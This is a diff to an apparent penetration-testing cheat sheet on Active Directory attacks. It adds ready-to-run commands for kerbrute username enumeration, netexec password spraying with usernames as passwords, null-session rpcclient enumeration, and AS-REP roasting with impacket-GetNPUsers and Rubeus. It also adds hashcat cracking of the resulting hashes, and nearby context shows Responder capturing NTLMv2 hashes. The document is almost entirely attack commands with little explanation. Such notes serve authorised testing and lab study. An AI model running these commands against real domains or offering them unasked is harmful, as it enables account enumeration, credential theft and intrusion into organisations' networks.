@@ -31,10 +31,16 @@ netexec smb $DC_IP -u '.' -p '' --rid-brute
 
 # Kerbrute — valid username enumeration via Kerberos
 kerbrute userenum --dc $DC_IP --domain $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum --dc $DC_IP --domain $DOMAIN /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt -o valid_users.txt
+
+# Netexec with validusers 
+netexec smb $DC_IP -u usernames.txt -p usernames.txt --no-bruteforce 
 
 # Rpcclient
 rpcclient -U "" -N $DC_IP
+rpcclient -U "" -N $DC_IP -c "enumdomusers"
+
 rpcclient -U <username> $DC_IP 
 > enumdomusers 
 > enumdomains
@@ -62,6 +68,26 @@ nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 10.10.10.0
 sudo responder -I eth0 -wfv
 # Captures NTLMv2 hashes when machines try to resolve names
 # Common triggers: accessing \\nonexistentshare, printers, etc.
+```
+
+### AS-REP Roasting
+
+```bash
+# Find accounts with pre-auth disabled (no creds needed)
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP
+
+# With valid credentials
+impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request
+```
+
+```powershell
+# From Windows (Rubeus)
+.\Rubeus.exe asreproast /outfile:asrep.hash
+```
+
+```bash
+# Crack
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
 ## 2.2 Authenticated LDAP Enumeration
